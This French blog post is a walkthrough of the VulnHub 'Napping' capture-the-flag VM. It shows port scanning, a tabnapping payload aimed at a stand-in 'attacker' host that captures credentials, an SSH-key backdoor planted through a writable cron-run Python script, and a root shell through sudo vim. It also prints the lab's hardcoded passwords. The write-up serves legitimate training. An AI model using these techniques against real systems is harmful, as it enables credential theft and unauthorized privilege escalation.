# Solution du CTF Napping de VulnHub

Intro et Setup
--------------

J'avais un peu de temps à tuer alors j'en ait profité pour piocher une VM récente sur VulnHub et m'amuser un peu.  

Notez que cela n'était pas arrivé depuis un an environ, il faut dire que le développement de [Wapiti](https://github.com/wapiti-scanner/wapiti) va bon train et m'occupe pleinement :)  

Ici j'ai affaire à une VM Linux baptisée [Napping](https://www.vulnhub.com/entry/napping-101,752/) de type boot2root. Mais nous ne sommes pas là pour nous endormir alors c'est parti !  

Pour la configuration réseau de la VM je conseille la création d'un réseau privé hôte (s'il n'existe pas déjà) en passant dans le menu *Gestionnaire de réseau hôte* de VirtualBox.  

Ce mode est plus sécurisé que le mode bridge (qui revient à intégrer une machine vulnérable sur votre réseau) et moins galère à administrer que le mode NAT (surtout que l'on ne saurait pas quels ports forwarder ici).  

Aussi ça peut vous permettre de rajouter une machine virtuelle qui accéderait au même réseau, pratique si vous désirez par exemple attaquer la VM depuis une VM Kali.  

Une fois le réseau hôte créé il faudra le sélectionner dans les paramètres réseau de la machine vulnérable.  

Au menu
-------

Si vous configurez votre réseau hôte avec une plage d’adresse DHCP de petite taille vous n'aurez aucun problème à deviner l'adresse IP de la VM mais dans le doute vous pouvez toujours effectuer un scan ping sur le réseau :  

```plain
sudo nmap -sP -T5 192.168.3.0/24 -v
```

Dans l'output il sera aisé de retrouver la VM car son adresse MAC sera affichée comme étant liée au constructeur VirtualBox (note: j'ai remplacé l'IP par *napping* dans l'article) :  

```plain
Nmap scan report for napping
Host is up, received arp-response (0.00046s latency).
MAC Address: 08:00:27:49:EE:4D (Oracle VirtualBox virtual NIC)
```

On lance un scan exhaustif des ports:  

```bash
$ sudo nmap -T5 -sC -Pn -p- napping

Nmap scan report for napping
Host is up (0.00018s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Login
MAC Address: 08:00:27:49:EE:4D (Oracle VirtualBox virtual NIC)
```

Scan rapide
-----------

C'est parti pour lancer un petit *Wapiti* des familles sur le site web:  

```bash
./bin/wapiti -u http://napping/ -m all --color
```

Le scanner détecte quelques vulnérabilités de faible importance et remonte quelques infos:  

* absence de CSP et d'entêtes d'amélioration de la sécurité (X-Frame-Options, etc)
* formulaire non protégé par un token CSRF
* présence de */config.php* (ne retourne rien) et */server-status* (403 classique)
* Apache en version 2.4.41
* failles XSS sur un formulaire de login

Le site propose de s'enregistrer alors je créé un compte avec *devloop* / *123456* qui me permet de me connecter et me redirige vers */welcome.php*  

Une fois sur cette page on peut soumettre une URL via un formulaire avec la promesse que la page *"sera revue par l'administrateur"*.  

![Napping VulnHub CTF challenge link submit](https://raw.githubusercontent.com/devl00p/blog/master/images/vulnhub/napping_submit.png)

A regarder le code source des pages on ne remarque rien de particulier (du type un champ caché qui permettrait de choisir un ID utilisateur pour la fonction de réinitialisation du mot de passe).  

Toutefois les formulaires ne sont pas protégés contre les attaques CSRF (pas de tokens rattachés à la session en cours).

Dig in
------

A ce stade là, au vue de la fonctionnalité annoncée et l'absence d'autres failles il est clair que l'on semble en présence d'une de ces failles:  

* SSRF (Server Side Request Forgery), à confirmer si c'est exploitable
* XSS / CSRF (Cross Site Request Forgery)

On place donc un Ncat en écoute et on renseigne notre URL dans le formulaire:  

```plain

$ ncat -l -p 8888 -v
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from napping.
Ncat: Connection from napping:53238.
GET / HTTP/1.1

Host: 192.168.10.25:8888
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

Hmmm... Ce n'est pas un navigateur donc les failles XSS / CSRF semblent tomber à l'eau.  

Ce n'est pas non plus un outil / librairie multi-protocole comme cURL qui aurait pu nous permettre de récupérer des fichiers par le schéma *file://* par exemple. Dans tous les cas la requête est faite en aveugle dans le sens où le site ne nous retourne pas les données récupérées.  

Pas de suppositions hâtives : peut être qu'un navigateur est lancé localement sur la page téléchargée. Je prépare donc une page HTML avec un tag script qui doit charger un fichier JS depuis mon serveur mais toujours pas de touche après plusieurs minutes (le serveur semble laisser un délai entre la soumission d'une URL et son traitement).  

L'utilisation de la librairie python bien connue *Requests* par le serveur laisse penser que tout est traité depuis Python donc pas d'injection de commande possible.  

J'ai toutefois vérifié cela en balançant point virgules, backticks, pipes, ampersand et autres dollars dans l'URL mais rien n'a aboutit.  

C'est dans ces conditions que l'on souhaiterait disposer d'une encyclopédie de tous les types de vulnérabilités pour s'assurer que l'on a rien loupé.  

Faute d'idée j'ai donc cherché un indice sur le challenge pour savoir de quoi il retournait...

Tabnapping
----------

J'ai beau savoir que le nom des challenges sert parfois d'indice et j'ai beau me souvenir de ce qu'est le tabnapping et comment je l'avais trouvé intéressant à l'époque, mes neurones ne se sont pas connectés.  

Le principe du tabnapping et que la victime doit cliquer sur un lien depuis une page web. Le lien s'ouvre dans un nouvel onglet et ce dernier dispose d'un contrôle restreint sur la page (onglet) qui l'a amené là dans le navigateur.  

Via l'utilisation de Javascript la page malicieuse peut changer l'URL de l'onglet d'origine sans que la victime ne s'en aperçoive. Si c'est fait de manière subtile (la nouvelle page est visuellement proche de la page d'origine) ou si l'onglet n'est pas réutilisé avant un moment alors la victime peut penser que le contenu est légitime et ne pensera même pas à vérifier la barre d'adresse.  

On trouve différentes vidéos de démonstration sur YouTube [dont celle-ci](https://www.youtube.com/watch?v=VyaXnBjV-IE).

Du coup j'édite le code HTML suivant et je passe son URL dans le formulaire :  

```html

<html>
    <body>
        <script>window.opener.location="http://attacker/redirected";</script>
```

Après un moment j'obtiens bien une requête sur */redirected* ce qui valide ce scénario.  

Je télécharge la page de login du CTF, modifie l'entrée *action* du formulaire et je la sers en local. Je modifie aussi l'URL qui écrase *window.opener.location*.  

Je lance ensuite Wireshark et soumet l'URL. Au bout de quelques minutes j'ai une requête POST avec ces données:  

```plain
username=daniel&password=C%40ughtm3napping123
```

soit les identifiants suivants : *daniel / C@ughtm3napping123*  

Ceux-ci ne permettent pas de se connecter à l'appli web mais ils fournissent un shell sur le port SSH !  

Escalading
----------

Ce compte fait partie du groupe *administrators* :  

```plain
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel),1002(administrators)
```

Aussitôt je regarde les fichiers appartenant à ce groupe :  

```bash
find / -group administrators  2> /dev/null
```

Parmi les résultats il y a un fichier appartenant à l'utilisateur *adrian* :  

```plain
/home/adrian/query.py
```

et les membres du groupe ont accès en écriture :  

```plain
-rw-rw-r-- 1 adrian administrators  481 Oct 30 19:15 query.py
```

Il s'agit d'un script qui logue l'état du site dans un fichier *site\_status.txt*. Le code est le suivant :  

```python
from datetime import datetime
import requests

now = datetime.now()

r = requests.get('http://127.0.0.1/')
if r.status_code == 200:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Site is Up: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
else:
    f = open("site_status.txt","a")
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    f.write("Check Out Site: ")
    f.write(dt_string)
    f.write("\n")
    f.close()
```

De toute évidence le script est lancé régulièrement :  

```bash
daniel@napping:~$ tail -1 /home/adrian/site_status.txt
Site is Up: 16/11/2021 22:36:01
daniel@napping:~$ date
Tue Nov 16 22:36:50 UTC 2021
```

On le retrouve dans la crontab de l'utilisateur (*crontab -l*):  

```plain
*/2 * * * * /usr/bin/python3 /home/adrian/query.py
```

La version de Python ne se devine pas à la lecture du code mais Python2 n'est pas présent sur la machine, on va donc éditer le fichier et ajouter du code en Python 3.  

Ceux qui n'ont pas l'habitude de programmer en Python peuvent utiliser *os.system* pour exécuter un script externe qui se chargera de leur ouvrir les portes.  

Etant donné que le script *query.py* est exécuté avec l'utilisateur *adrian* nos modifications le seront aussi. On peut profiter de ces droits à l'exécution pour rajouter notre clé SSH aux clés autorisées pour ce compte.  

On aura alors un script comme celui-ci :  

```python

import os
import stat

os.mkdir("/home/adrian/.ssh")
with open("/home/adrian/.ssh/authorized_keys", "w") as fd:
  fd.write("ssh-rsa --snip--ma-cle-publique-ssh--snip--")

os.chmod("/home/adrian/.ssh/authorized_keys", stat.S_IREAD|stat.S_IWRITE)

```

On édite *query.py* avec Vim et on rajoute notre code au début.  

Quelques temps après notre clé est acceptée pour la connexion au compte adrian :  

```plain

adrian@napping:~$ cat user.txt
You are nearly there!

```

Premier réflexe, voir ce qu'il est possible de faire avec ce compte membre du groupe *administrators* :  

```plain
adrian@napping:~$ sudo -l
Matching Defaults entries for adrian on napping:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User adrian may run the following commands on napping:
    (root) NOPASSWD: /usr/bin/vim
```

On a un classique cas de lolbin. Sudo autorise l'exécution de */usr/bin/vim* (il faut donner le path en entier) en tant que root sans mot de passe. De là on utilisera la commande *:!bash* pour nous échapper de Vim et accéder à un shell.  

```plain

sudo /usr/bin/vim
(--snip exécution de bash via :!bash snip--)
root@napping:/home/adrian# id
uid=0(root) gid=0(root) groups=0(root)

root@napping:~# cat root.txt
Admins just can't stay awake tsk tsk tsk
```

Sous le capot
-------------

Voici le script Python qui se chargeait de simuler le tabnapping:  

```python
import requests
import re
import mysql.connector

mydb = mysql.connector.connect(
  host="localhost",
  user="adrian",
  password="P@sswr0d456",
  database="website"
)

mycursor = mydb.cursor()

mycursor.execute("SELECT * FROM links")

myresult = mycursor.fetchall()

data = {
        "username":"daniel",
        "password":"C@ughtm3napping123"
        }

for x in myresult:
  url1 = x[0]

  try:
    r1 = requests.get(url1,timeout=2)
    search = r1.text
    if (search.find('location.replace') != -1):
        match = re.findall("http(.*)\);",search)
        new_url = 'http' + match[0].rstrip(match[0][-1])
        r2 = requests.post(new_url,data=data,timeout=2)

    elif (search.find('opener.location') != -1):
        match = re.findall("http(.*);",search)
        new_url = 'http' + match[0].rstrip(match[0][-1])
        r2 = requests.post(new_url,data=data,timeout=2)

  except requests.exceptions.ReadTimeout:
    continue
```

Comme on le constate aucun navigateur n'est exécuté ici. Le script vérifie la présence de *opener.location* ou *location.replace* dans la page et s'il est présent il cherche une URL pour lui envoyer les identifiants via HTTP POST.  

Hot or not?
-----------

C'est toujours cool de pouvoir pratiquer une vulnérabilité spécifique mais quand il s'agit d'une vulnérabilité qui a été depuis patchée partout on n'y pense pas forcément.  

C'est le cas du tabnapping, corrigé dans tous les navigateurs ou des failles bashs (Shellshock et ses variantes).  

Le nom du CTF donne un indice mais peut être un faux TODO ou une issue mentionnant plus explicitement le type de vulnérabilité (comme c'est souvent le cas sur *HackTheBox*) aurait aidé.  

Un commentaire dans la page HTML juste au dessus du lien aurait été tout aussi efficace.  

Aussi le user-agent utilisé ne laisse pas supposer qu'une faille de ce type (qui nécessite un navigateur comprenant le JS) soit présente.  

Sans compter qu'avec les correctifs des navigateurs la page dans sa version actuelle n'est pas vulnérable, il faut désormais expliciter que *opener* doit être accepté :  

```html
<a href="whatever.html" target="_blank" rel="opener">click me</a>
```

En dehors de l'automatisation qui manquait de réalisme il y a aussi le fait que les identifiants interceptés ne permettent pas un accès sur le site web alors que le script simule un administrateur qui s'y connecte. Il aurait fallut une étape supplémentaire.  

Let me fix that for you
-----------------------

L'interface web aurait du disposer d'une partie administrateur affichant réellement les URLs postées par les utilisateurs.  

Un soin particulier aurait du être porté à se protéger des attaques XSS et CSRF pour que les joueurs du CTF ne les prennent pas en considération.  

Enfin un browser headless aurait du être utilisé pour que le tabnapping soit bien réel. Ce qui peut se faire avec Selenium et Firefox + gecko driver :  

```python
from time import sleep

from selenium import webdriver
from selenium.webdriver import Firefox
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By

profile = webdriver.FirefoxProfile()
options = Options()
options.headless = True  # Set to false if you want to see the browser working
service = Service("/usr/bin/geckodriver")
log_path = "/tmp/geckodriver.log"
driver = Firefox(service=service, options=options, service_log_path=log_path, firefox_profile=profile)
driver.set_page_load_timeout(60)
driver.set_script_timeout(30)
driver.implicitly_wait(90)

# Open the webpage containing the submitted link
driver.get("http://127.0.0.1/links.html")
sleep(1)
# Keep the handle for this window
first_tab_handle = driver.current_window_handle

# Find the link and click it
new_tab_link = driver.find_element(By.XPATH, '//a[contains(@rel,"opener")]')
new_tab_link.click()
# We are now on the new window, this one should trigger the opener thing and change the first window
sleep(2)

# Come back to the first window
driver.switch_to.window(first_tab_handle)
# Fill the login form and submit (should catch exceptions if not present)
driver.find_element(By.NAME, "username").send_keys("daniel")
driver.find_element(By.NAME, "password").send_keys("C@ughtm3napping123")
driver.find_element(By.XPATH, "//input[@type='submit']").click()
sleep(1)
driver.close()
```


*Published November 19 2021 at 12:10*